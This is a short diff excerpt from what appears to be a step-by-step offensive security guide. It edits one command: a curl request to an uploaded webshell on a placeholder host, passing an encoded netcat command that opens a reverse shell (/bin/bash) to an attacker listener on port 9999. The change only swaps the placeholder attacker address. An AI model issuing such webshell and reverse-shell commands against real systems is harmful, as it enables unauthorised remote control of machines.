@@ -189,7 +189,7 @@ Research your target OS fully
     ```
     Execute your nc command
     ```
-    curl http://a.b.c.d/uploads/webshell.php?cmd=nc%20d.e.f.g%209999%20-e%20%2Fbin%2Fbash
+    curl http://a.b.c.d/uploads/webshell.php?cmd=nc%20e.f.g.h%209999%20-e%20%2Fbin%2Fbash
     ```
     Check your listener
     ```
